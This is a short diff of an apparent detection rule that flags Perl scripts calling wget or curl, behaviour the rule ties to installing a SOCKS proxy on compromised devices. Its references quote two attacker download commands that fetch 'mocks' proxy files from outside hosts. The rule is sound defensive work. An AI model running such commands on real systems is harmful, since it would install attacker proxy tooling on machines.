@@ -1,7 +1,7 @@
 title: suspicious Perl downloading a file via wget or curl
 id: 07bfb2ac-910c-488c-90e1-b508633e17f7
 status: experimental
-description: Looking for perl scripts executing curl or wget to download a file. This has been seen as part of installing a socks proxy onto a compromised device.
+description: Looking for perl scripts executing curl or wget to download a file. This has been seen as part of installing a socks proxy onto a compromised device. - https://uncoder.io/ to convert easily
 references:
     - wget http://switch.dl.sourceforge.net/sourceforge/mocks/mocks-0.0.2.tar.gz
     - curl -O http://andromeda.covers.de/221/mocks.conf
